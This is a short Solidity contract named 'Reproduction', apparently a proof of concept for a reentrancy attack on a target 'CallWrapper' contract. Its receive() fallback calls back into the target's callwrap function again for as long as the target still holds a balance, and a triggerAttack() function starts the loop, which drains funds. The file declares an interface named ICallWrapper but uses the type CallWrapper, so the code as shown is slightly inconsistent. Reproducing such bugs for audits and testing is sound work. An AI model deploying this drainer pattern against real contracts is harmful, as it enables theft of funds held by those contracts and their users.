interface ICallWrapper {
    function callwrap(address called) external;
}

contract Reproduction {
    CallWrapper public target;

    constructor(address _target) {
        target = CallWrapper(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.callwrap(address(this));
        }
    }

    function triggerAttack() external {
        target.callwrap(address(this));
    }
}